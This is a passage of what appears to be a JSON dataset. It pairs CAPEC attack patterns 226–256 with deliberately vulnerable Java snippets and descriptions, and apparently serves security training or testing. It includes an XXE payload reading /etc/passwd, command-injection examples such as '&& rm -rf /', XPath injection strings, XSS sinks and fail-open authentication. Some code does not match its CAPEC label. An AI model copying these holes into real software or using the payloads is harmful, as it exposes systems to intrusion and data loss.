        "capec_name": "Fingerprinting",
        "code_snippet": "public class SystemInfoService {\n    public void displaySystemInfo(HttpServletResponse response) throws IOException {\n        Properties props = System.getProperties();\n        StringBuilder info = new StringBuilder();\n        \n        info.append(\"OS: \" + props.getProperty(\"os.name\") + \" \" + \n                    props.getProperty(\"os.version\") + \"\\n\");\n        info.append(\"Java Version: \" + props.getProperty(\"java.version\") + \"\\n\");\n        info.append(\"Server Info: \" + getServletContext().getServerInfo() + \"\\n\");\n        info.append(\"Debug Mode: \" + isDebugEnabled() + \"\\n\");\n        info.append(\"System Architecture: \" + props.getProperty(\"os.arch\") + \"\\n\");\n        info.append(\"Available Processors: \" + \n                    Runtime.getRuntime().availableProcessors() + \"\\n\");\n        \n        response.setContentType(\"text/plain\");\n        response.getWriter().write(info.toString());\n    }\n    \n    private boolean isDebugEnabled() {\n        return true; // Debug mode always enabled\n    }\n}",
        "description": "This code demonstrates a vulnerable system information disclosure service that freely exposes sensitive system details including OS version, Java version, server information, debug status, and system architecture. The code makes no attempt to authenticate users or restrict access to this sensitive information, allowing system fingerprinting. Additionally, it leaves debug mode permanently enabled, which could be exploited for further system reconnaissance."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "public class AuthenticationServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String sessionId = request.getParameter(\"sessionId\");\n            Cookie[] cookies = request.getCookies();\n            String authCookie = null;\n            \n            for(Cookie cookie : cookies) {\n                if(cookie.getName().equals(\"auth_token\")) {\n                    authCookie = cookie.getValue();\n                    break;\n                }\n            }\n            \n            if(authCookie != null) {\n                // Vulnerable: No validation of cookie integrity\n                UserSession session = getUserSession(authCookie);\n                \n                // Vulnerable: No session expiration check\n                if(session != null) {\n                    // Vulnerable: Trusts client-side session data without server verification\n                    response.sendRedirect(\"/dashboard\");\n                    return;\n                }\n            }\n            \n            // Vulnerable: Allows session fixation by not generating new session ID\n            HttpSession session = request.getSession(false);\n            if(session == null) {\n                session = request.getSession(true);\n            }\n            session.setAttribute(\"authenticated\", true);\n            \n        } catch(Exception e) {\n            response.sendRedirect(\"/login\");\n        }\n    }\n}",
        "description": "This code demonstrates multiple session management vulnerabilities including reliance on unvalidated cookies, session fixation through reuse of session IDs, insufficient session expiration checks, and client-side authentication validation. The code accepts and trusts cookies and session IDs without proper validation or integrity checks, and doesn't implement proper session management practices."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "public class ResourceManager {\n    private Map<String, Object> resources = new HashMap<>();\n    \n    public void allocateResource(String userId, String resourceId) {\n        Object resource = new byte[1024 * 1024]; // Allocate 1MB\n        resources.put(userId + \"_\" + resourceId, resource);\n        \n        // Simulate long-running operation\n        try {\n            Thread.sleep(10000); // Hold for 10 seconds\n            processResource(resource);\n        } catch (InterruptedException e) {\n            // Ignore interruption\n        }\n    }\n    \n    private void processResource(Object resource) {\n        // No limit on concurrent processing\n        while(true) {\n            // Continuously process without timeout\n            // No resource cleanup\n        }\n    }\n    \n    public void handleRequest(String userId, String resourceId) {\n        // No authentication or authorization check\n        // No rate limiting\n        // No resource usage tracking\n        allocateResource(userId, resourceId);\n    }\n}",
        "description": "This code demonstrates multiple resource exhaustion vulnerabilities. It allows unlimited resource allocation without authentication, authorization, or rate limiting. The processResource method creates an infinite loop that holds resources indefinitely. Each request allocates 1MB of memory and holds it for at least 10 seconds, allowing an attacker to gradually consume system resources through repeated requests. The lack of cleanup and monitoring mechanisms makes it susceptible to resource exhaustion attacks."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "public class XMLProcessor {\n    public void processXMLWithDTD(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Vulnerable: No restrictions on DTD processing\n            factory.setValidating(true);\n            factory.setExpandEntityReferences(true);\n            \n            DocumentBuilder builder = factory.newDocumentBuilder();\n            StringReader reader = new StringReader(xmlInput);\n            InputSource source = new InputSource(reader);\n            Document doc = builder.parse(source);\n            \n            // Process the XML document\n            NodeList nodes = doc.getElementsByTagName(\"*\");\n            for (int i = 0; i < nodes.getLength(); i++) {\n                // Process each node without validation\n                Node node = nodes.item(i);\n                processNode(node);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processNode(Node node) {\n        // Process node content without any validation\n        System.out.println(node.getTextContent());\n    }\n}",
        "description": "This vulnerable code processes XML input with DTD validation enabled but without proper restrictions. It allows unrestricted entity expansion, external entity references, and recursive entity definitions. The code doesn't implement any controls for DTD processing, making it susceptible to XML entity expansion attacks, external entity injection, and resource exhaustion through recursive entity references. The XML parser is configured to blindly trust and process all DTD definitions without validation or limitations."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\n\npublic class VulnerableXMLParser {\n    public void parseXML(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            while(true) {\n                Document doc = builder.parse(xmlInput);\n                System.gc();\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\"?>\\n\" +\n                           \"<!DOCTYPE foo [\\n\" +\n                           \"<!ELEMENT foo ANY >\\n\" +\n                           \"<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\" >\\n\" +\n                           \"<!ENTITY xxe1 \\\"&xxe;&xxe;&xxe;&xxe;&xxe;\\\">\\n\" +\n                           \"<!ENTITY xxe2 \\\"&xxe1;&xxe1;&xxe1;&xxe1;&xxe1;\\\">\\n\" +\n                           \"]>\\n\" +\n                           \"<foo>&xxe2;</foo>\";\n        \n        new VulnerableXMLParser().parseXML(maliciousXML);\n    }\n}",
        "description": "This code demonstrates a vulnerable XML parser that is susceptible to XML Entity Expansion (XEE) attacks. The parser allows external entity references and recursively processes entity expansions without any resource limits. The code creates a loop that continuously parses the XML and lacks proper input validation. The malicious XML input contains nested entity references that can cause exponential entity expansion, leading to CPU exhaustion and denial of service."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport java.io.ByteArrayInputStream;\n\npublic class XMLParser {\n    public void parseXML(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Convert string to InputStream\n            ByteArrayInputStream input = new ByteArrayInputStream(xmlInput.getBytes(\"UTF-8\"));\n            \n            // Parse XML without validation or entity expansion limits\n            builder.parse(input);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code is vulnerable to XML Entity Expansion (XXE) attacks and billion laughs attacks due to missing XML validation, unrestricted entity expansion, and lack of resource limits. The code accepts XML input without schema validation and doesn't set limits on entity expansion or recursion, allowing attackers to craft malicious XML that could cause denial of service through excessive CPU and memory consumption."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "public class XMLParser {\n    public void parseXMLData(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Missing XML Schema validation\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Directly parse untrusted XML without size validation\n            Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes()));\n            \n            // Recursive function without depth control\n            processNode(doc.getDocumentElement());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processNode(Node node) {\n        // No limit on memory allocation for node storage\n        ArrayList<String> nodeData = new ArrayList<>();\n        \n        // Recursive call without depth checking\n        NodeList children = node.getChildNodes();\n        for (int i = 0; i < children.getLength(); i++) {\n            nodeData.add(children.item(i).getTextContent());\n            processNode(children.item(i));\n        }\n        \n        // Store processed data in memory without size limits\n        byte[] serializedData = serialize(nodeData);\n    }\n    \n    private byte[] serialize(Object obj) {\n        try {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            ObjectOutputStream oos = new ObjectOutputStream(baos);\n            oos.writeObject(obj);\n            return baos.toByteArray();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an XML parser that accepts untrusted input without proper validation, schema checking, or resource limits. It includes unbounded recursion when processing nodes, unrestricted memory allocation, and unsafe serialization. The code is susceptible to XML bombs, billion laughs attacks, and memory exhaustion through oversized payloads."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "public class ResourceManager {\n    private static boolean isAdmin = false;\n\n    public static void main(String[] args) {\n        UserSession session = new UserSession(\"user1\");\n        accessAdminResource(session);\n    }\n\n    public static void accessAdminResource(UserSession session) {\n        try {\n            // Insecure privilege check - race condition between check and use\n            if(!isAdmin) {\n                isAdmin = session.elevatePrivileges();\n            }\n            // No proper verification if elevation actually succeeded\n            deleteSystemFiles();\n        } catch(SecurityException e) {\n            // Improper handling of insufficient privileges\n            isAdmin = true; // Dangerous fallback that bypasses security\n            deleteSystemFiles();\n        }\n    }\n\n    private static void deleteSystemFiles() {\n        if(isAdmin) { // Using unreliable global flag\n            System.out.println(\"Deleting system files...\");\n        }\n    }\n}\n\nclass UserSession {\n    private String username;\n    \n    public UserSession(String username) {\n        this.username = username;\n    }\n\n    public boolean elevatePrivileges() {\n        // No proper authentication or verification\n        return true;\n    }\n}",
        "description": "This code demonstrates multiple privilege escalation vulnerabilities including improper privilege management, insecure synchronization between privilege checks and operations, improper handling of insufficient privileges, and lack of proper compartmentalization. The code uses a global flag for privilege status, doesn't properly verify privilege elevation, and contains an insecure fallback mechanism that bypasses security checks."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "public class PrivilegedService {\n    static {\n        System.loadLibrary(\"user_supplied_library\");\n    }\n\n    public static void executeAsRoot() {\n        // Unnecessarily running with root privileges\n        ProcessBuilder pb = new ProcessBuilder();\n        pb.command(\"sh\", \"-c\", System.getProperty(\"user.command\"));\n\n        try {\n            Process p = pb.start();\n            p.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        // No privilege check or dropping\n        if (args.length > 0) {\n            System.setProperty(\"user.command\", args[0]);\n            executeAsRoot();\n        }\n    }\n}",
        "description": "This code demonstrates multiple privilege-related vulnerabilities. It loads a user-supplied library without verification, executes commands with root privileges without dropping them, and allows arbitrary command execution through user input. The process runs with unnecessary elevated privileges throughout its lifecycle and lacks proper permission checks."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "public class AuthenticationManager {\n    private static String sessionToken;\n    \n    public static void setSessionToken(String token) {\n        sessionToken = token;\n    }\n    \n    public static boolean authenticate(String receivedToken) {\n        // Vulnerable to capture-replay and thread safety issues\n        return sessionToken.equals(receivedToken);\n    }\n    \n    public static void main(String[] args) {\n        // Multiple threads accessing shared static variable\n        new Thread(() -> {\n            setSessionToken(\"token123\");\n        }).start();\n        \n        new Thread(() -> {\n            boolean isValid = authenticate(\"token123\");\n            System.out.println(\"Authentication result: \" + isValid);\n        }).start();\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities: a non-final static variable accessed by multiple threads without synchronization, and a simple authentication mechanism vulnerable to capture-replay attacks. The sessionToken is stored statically and can be accessed/modified by multiple threads without proper synchronization, while the authentication method performs a simple string comparison that could be exploited through network traffic capture and replay."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "public class AuthHandler {\n    private static byte[] lastSeenToken = null;\n\n    public static boolean authenticateRequest(byte[] authToken) {\n        // Vulnerable to replay attacks\n        if (Arrays.equals(authToken, lastSeenToken)) {\n            return true;\n        }\n        \n        // Store token for future comparisons\n        lastSeenToken = authToken.clone();\n        \n        try {\n            return verifyWithServer(authToken);\n        } catch (Exception e) {\n            // Unchecked error condition\n            return true;  // Default to allowing access\n        }\n    }\n\n    public static void handleSignal(int signal) {\n        // Non-async-safe operation in signal handler\n        authenticateRequest(lastSeenToken);\n    }\n\n    private static boolean verifyWithServer(byte[] token) {\n        // Verification logic here\n        return true;\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including authentication bypass through capture-replay attacks, unsafe signal handling, and unchecked error conditions. The code stores previously seen authentication tokens and accepts repeated tokens, making it vulnerable to replay attacks. It also performs non-async-safe operations in a signal handler and fails to properly handle error conditions, defaulting to allowing access."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "public class UnsafeNativeAccess {\n    private static native void unsafeNativeOperation();\n    \n    private class SensitiveDataHolder {\n        private String secretKey = \"sk_live_12345\";\n        private int[] sensitiveArray = new int[1024];\n    }\n    \n    public void executeSandboxedOperation() {\n        try {\n            System.loadLibrary(\"unsafelib\");\n            SensitiveDataHolder sensitive = new SensitiveDataHolder();\n            unsafeNativeOperation();\n        } catch (UnsatisfiedLinkError e) {\n            System.err.println(\"Failed to load native library: \" + e.getMessage() + \n                             \"\\nStack trace: \" + e.getStackTrace().toString());\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates unsafe JNI usage combined with sensitive data exposure through inner classes. It loads an untrusted native library, exposes sensitive data in an inner class, and reveals detailed error information. The native operation could potentially bypass Java's security manager and access sensitive memory directly."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "public class AuthorizationManager {\n    private static final String ADMIN_PATH = \"/admin\";\n    private static final String USER_PATH = \"/user\";\n    \n    public boolean isAuthorized(String requestUrl, String userRole) {\n        // Incorrect authorization before full URL parsing\n        if (requestUrl.startsWith(ADMIN_PATH)) {\n            return userRole.equals(\"ADMIN\");\n        }\n        \n        // Vulnerable: Attacker can use /admin/../user to bypass\n        String normalizedUrl = requestUrl.replace(\"..\", \"\");\n        \n        if (normalizedUrl.startsWith(USER_PATH)) {\n            return userRole.equals(\"USER\") || userRole.equals(\"ADMIN\");\n        }\n        \n        // Incorrect control flow - always returns true for unknown paths\n        return true;\n    }\n    \n    public boolean checkAccess(String path) {\n        // Multiple unprotected alternate paths\n        if (path.equals(\"/admin/dashboard\")) {\n            return checkMainPath();\n        }\n        // Alternate path without protection\n        if (path.equals(\"/dashboard/admin\")) {\n            return true;\n        }\n        return false;\n    }\n    \n    private boolean checkMainPath() {\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including authorization checks before proper URL parsing, insufficient path canonicalization, incorrect control flow implementation, and unprotected alternate paths to restricted resources. The code also shows improper isolation of symbolic constants and violation of secure design principles by performing incomplete security checks."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "public class OnlineStore {\n    private boolean isAuthenticated = false;\n\n    public void clientSideAuthentication(String username, String password) {\n        // Client-side only authentication\n        if (username.equals(\"admin\") && password.equals(\"password123\")) {\n            isAuthenticated = true;\n        }\n    }\n\n    public boolean processPayment(double amount) {\n        // No server-side validation of authentication\n        if (isAuthenticated) {\n            // Process payment logic\n            return true;\n        }\n        return false;\n    }\n\n    public void validatePurchase(String receipt) {\n        // Client-side validation only\n        if (receipt != null && !receipt.isEmpty()) {\n            processPurchase(receipt);\n        }\n    }\n\n    private void processPurchase(String receipt) {\n        // Critical server-side functionality with no proper validation\n        System.out.println(\"Processing purchase: \" + receipt);\n    }\n}",
        "description": "This vulnerable code demonstrates client-side security enforcement where authentication and validation are performed only on the client side. The server blindly trusts client-side validation without implementing proper server-side checks. A malicious user could bypass authentication and access critical functionality by modifying the client or directly calling server methods."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "public class FileManager {\n    public void loadResource(String resourcePath) {\n        try {\n            String filePath = \"/data/resources/\" + resourcePath;\n            FileInputStream fis = new FileInputStream(filePath);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));\n            \n            String content = reader.readLine();\n            // Process content without validation\n            processContent(content);\n            \n            reader.close();\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processContent(String content) {\n        // Process the content without any validation\n        Runtime.getRuntime().exec(content);\n    }\n}",
        "description": "This code is vulnerable to resource injection as it allows unvalidated user input in resourcePath to access files outside the intended directory through path traversal. It also executes content from the file without any validation, potentially allowing command injection. The lack of input validation on both the resource path and content makes it susceptible to multiple attacks."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "public class LegacyAuthenticator {\n    @Deprecated\n    private String getPasswordFromFile(String username) {\n        FileInputStream fis = null;\n        try {\n            fis = new FileInputStream(\"passwords.txt\");\n            byte[] buffer = new byte[1024];\n            fis.read(buffer);\n            return new String(buffer);\n        } catch (IOException e) {\n            return null;\n        } finally {\n            try {\n                if (fis != null) fis.close();\n            } catch (IOException e) { }\n        }\n    }\n\n    public boolean authenticate(String username, String password) {\n        String storedPassword = getPasswordFromFile(username);\n        if (storedPassword != null) {\n            return password.equals(storedPassword);\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates several vulnerabilities including use of deprecated methods, insecure file handling, and potential authentication bypass. It uses an obsolete file reading mechanism, doesn't properly handle file descriptors, and implements an unsafe authentication mechanism that could be bypassed through file manipulation."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "public class UserScriptExecutor {\n    public void executeUserScript(String userInput) {\n        try {\n            String script = \"var result = \" + userInput;\n            javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager();\n            javax.script.ScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n            Object result = engine.eval(script);\n            System.out.println(\"Script result: \" + result);\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        UserScriptExecutor executor = new UserScriptExecutor();\n        String userInput = System.getProperty(\"user.input\");\n        executor.executeUserScript(userInput);\n    }\n}",
        "description": "This code demonstrates code injection vulnerability by directly executing user-provided JavaScript code without any validation or sanitization. It uses the JavaScript engine to evaluate arbitrary user input, allowing an attacker to inject and execute malicious code. The code violates multiple CWEs by failing to properly validate input (CWE-1173), not neutralizing special elements (CWE-74), and enabling direct code injection (CWE-94)."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "public class UserProfileServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userProfile\");\n        String userName = request.getParameter(\"name\");\n        \n        // Vulnerable: directly embedding unvalidated input into HTML attributes\n        String htmlContent = \"<div class='profile'>\"\n            + \"<img src='\" + userInput + \"' style='\" + request.getParameter(\"style\") + \"' \"\n            + \"onmouseover='showProfile(\\\"\" + userName + \"\\\")' />\"\n            + \"<a href='\" + request.getParameter(\"link\") + \"' style='\" + request.getParameter(\"linkStyle\") + \"'>\"\n            + userName + \"</a></div>\";\n            \n        PrintWriter out = response.getWriter();\n        out.println(htmlContent);\n    }\n}",
        "description": "This code demonstrates a vulnerable web application that accepts user input and directly embeds it into HTML attributes without proper sanitization. The code accepts parameters for image source, styles, and links, then incorporates them into HTML tags without escaping or validating the input. This makes it susceptible to XSS attacks through injection of malicious JavaScript in attributes like style, onmouseover, and href."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "public class VulnerableWebPage {\n    public String createLink(String userInput) {\n        // Directly embedding user input into an anchor tag without sanitization\n        String htmlContent = \"<a href='\" + userInput + \"'>Click here</a>\";\n        \n        // Add img tag with user-controlled source\n        htmlContent += \"<img src='\" + userInput + \"' onerror='javascript:alert(1)'>\";\n        \n        // Using base64 encoded content without validation\n        String base64Input = Base64.getEncoder().encodeToString(userInput.getBytes());\n        htmlContent += \"<a href='data:text/html;base64,\" + base64Input + \"'>Encoded link</a>\";\n        \n        return htmlContent;\n    }\n    \n    public void displayUserContent(HttpServletResponse response, String userInput) throws IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(createLink(userInput));\n    }\n}",
        "description": "This code demonstrates a vulnerable web application that fails to sanitize user input when creating HTML links and img tags. It accepts user input and directly embeds it into href attributes and img src attributes without proper validation or encoding. The code also handles base64 encoded content without checking for malicious scripts, allowing potential XSS attacks through URI schemes and encoded content."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userContent\");\n        \n        // Vulnerable validation that can be bypassed with doubled characters\n        if (!userInput.contains(\"<script\")) {\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\");\n            out.println(userInput);  // Direct output of unfiltered content\n            out.println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This code contains a vulnerable XSS filter that can be bypassed using doubled characters. The validation only checks for '<script' without properly neutralizing special characters or considering variations like '<<script'. An attacker can bypass the check by doubling characters in the input, allowing execution of malicious scripts in the context of other users' browsers."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "public class FlashContentFilter {\n    private static final String[] XSS_BLACKLIST = {\n        \"<script>\",\n        \"javascript:\"\n    };\n    \n    public String filterUserContent(String input) {\n        String filtered = input;\n        for(String blocked : XSS_BLACKLIST) {\n            filtered = filtered.replace(blocked, \"\");\n        }\n        return filtered;\n    }\n    \n    public String processImageTag(String userInput) {\n        return \"<img src='\" + userInput + \"'>\";\n    }\n    \n    public void configureCrossDomain() {\n        String crossDomainPolicy = \"<?xml version='1.0'?>\";\n        crossDomainPolicy += \"<cross-domain-policy>\";\n        crossDomainPolicy += \"<allow-access-from domain='*' />\";\n        crossDomainPolicy += \"</cross-domain-policy>\";\n    }\n}",
        "description": "This vulnerable code demonstrates multiple XSS-related weaknesses: an incomplete blacklist that can be bypassed with alternate syntax or doubled characters, unsafe handling of IMG tag attributes, and an overly permissive cross-domain policy. The filterUserContent method uses a limited blacklist that can be bypassed, while processImageTag directly embeds user input into HTML without proper encoding. The cross-domain policy allows access from any domain, creating a security risk."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "public class UnsafeWebFilter {\n    public String filterUserInput(String input) {\n        // Basic filter that only checks for obvious script tags\n        String filtered = input.replaceAll(\"<script>\", \"\");\n        \n        // Vulnerability: Does not handle invalid characters or doubles\n        // Attacker can use: \"<scr\\0ipt>\" or \"<sscriptcript>\" \n        return filtered;\n    }\n    \n    public void displayUserComment(String userInput) {\n        String filtered = filterUserInput(userInput);\n        // Directly embedding filtered content into HTML\n        String htmlOutput = \"<div class='comment'>\" + filtered + \"</div>\";\n        // Send htmlOutput to browser\n    }\n}",
        "description": "This vulnerable code demonstrates insufficient filtering of invalid characters in web input. The filter only removes basic '<script>' tags but fails to account for null bytes, doubled characters, or other invalid character sequences. An attacker could bypass this filter using various techniques like inserting null bytes (<scr\\0ipt>) or doubled characters (<sscriptcript>) to execute XSS attacks. The code also directly embeds the filtered content into HTML without proper encoding."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "public class SystemCommand {\n    public static void executeCommand(String userInput) {\n        try {\n            String command = \"ping \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        String userInput = args[0];\n        executeCommand(userInput);\n    }\n}",
        "description": "This code demonstrates a vulnerable command injection scenario where user input is directly concatenated into a system command without any sanitization. An attacker could inject additional commands using shell metacharacters (e.g., '127.0.0.1 && rm -rf /') to execute arbitrary commands on the system."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "public class TerminalCommandExecutor {\n    public void executeCommand(String userInput) {\n        try {\n            String command = \"echo \" + userInput + \" > /dev/pts/0\";\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        TerminalCommandExecutor executor = new TerminalCommandExecutor();\n        String userInput = args[0];\n        executor.executeCommand(userInput);\n    }\n}",
        "description": "This code demonstrates vulnerable terminal device manipulation through command injection. It directly concatenates user input into a command string that writes to a terminal device without any input validation or sanitization. An attacker could inject malicious commands using special characters (like semicolons or pipes) to execute arbitrary commands on the system through the terminal device."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "public class XmlDatabase {\n    public String retrieveUserData(String username) {\n        try {\n            String xmlQuery = \"//users/user[username='\" + username + \"']/details\";\n            XPath xpath = XPathFactory.newInstance().newXPath();\n            Document doc = DocumentBuilderFactory.newInstance()\n                .newDocumentBuilder().parse(\"users.xml\");\n            NodeList result = (NodeList) xpath.evaluate(xmlQuery, doc, XPathConstants.NODESET);\n            return result.item(0).getTextContent();\n        } catch (Exception e) {\n            return \"Error retrieving user data\";\n        }\n    }\n}",
        "description": "This vulnerable code directly concatenates user input into an XPath query without any input validation or sanitization. An attacker could inject malicious XML/XPath expressions to manipulate the query logic and potentially access unauthorized data from the XML database. For example, using input like \"' or '1'='1\" could return all user details."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "public class UnsafeLibraryLoader {\n    public static String LIB_PATH = \"/usr/local/lib/\";\n    \n    static {\n        System.load(LIB_PATH + System.getProperty(\"custom.library.path\"));\n    }\n    \n    public static void loadExternalCode(String libraryName) {\n        try {\n            String path = System.getProperty(\"user.home\") + \"/libs/\" + libraryName;\n            System.load(path);\n            \n            // Dynamically load class from arbitrary location\n            ClassLoader loader = new URLClassLoader(new URL[]{new File(path).toURI().toURL()});\n            Class<?> loadedClass = loader.loadClass(\"com.external.CustomCode\");\n            Object instance = loadedClass.newInstance();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable library loading by allowing arbitrary code execution through dynamic loading of libraries and classes from user-controlled locations. It uses global variables for paths, relies on machine-dependent file paths, and loads code from potentially untrusted sources without validation. The code allows loading of native libraries and Java classes from user-specified locations, which could include malicious or vulnerable versions of libraries."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "class FileLoader {\n    public void loadPHPFile(HttpServletRequest request) {\n        String fileName = request.getParameter(\"file\");\n        String baseDir = \"/var/www/html/\";\n        \n        try {\n            File file = new File(baseDir + fileName);\n            if(fileName.endsWith(\".php\")) {\n                ProcessBuilder pb = new ProcessBuilder(\"php\", file.getAbsolutePath());\n                Process process = pb.start();\n                // Execute PHP file without validation\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows arbitrary PHP file execution by accepting an unchecked filename parameter. It demonstrates path traversal vulnerability, inadequate file validation, and unsafe file execution. The code blindly trusts the file extension and location, allowing potential execution of malicious PHP files."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "public class RemoteCodeLoader {\n    public static void loadLibrary(String remoteUrl) {\n        try {\n            URL url = new URL(remoteUrl);\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n            Class<?> loadedClass = classLoader.loadClass(\"com.example.LibraryClass\");\n            Object instance = loadedClass.newInstance();\n            Method method = loadedClass.getMethod(\"execute\");\n            method.invoke(instance);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        String remoteLibUrl = \"http://untrusted-server.com/libraries/lib.jar\";\n        loadLibrary(remoteLibUrl);\n    }\n}",
        "description": "This code demonstrates vulnerable remote code loading by dynamically loading and executing a Java class from a remote URL without any integrity checks or validation. It creates a URLClassLoader to load a JAR file from an untrusted remote source and executes its code, potentially allowing an attacker to inject malicious code or exploit known vulnerabilities in older library versions."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\n\npublic class XMLProcessor {\n    public Document processXML(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            factory.setValidating(true);\n            \n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(xmlInput);\n            \n            System.out.println(\"Debug: Processing XML with DTD: \" + \n                doc.getDoctype().getSystemId());\n            \n            return doc;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This code is vulnerable to DTD injection and XML entity expansion attacks. It enables entity references and validation without proper restrictions, allowing attackers to include malicious DTDs. The code also exposes sensitive information through debug logging. The DocumentBuilderFactory is configured insecurely by enabling entity expansion and validation without limits on recursive entity references, potentially leading to XXE attacks and denial of service through billion laughs attacks."
    },
    {
        "capec_id": "256",
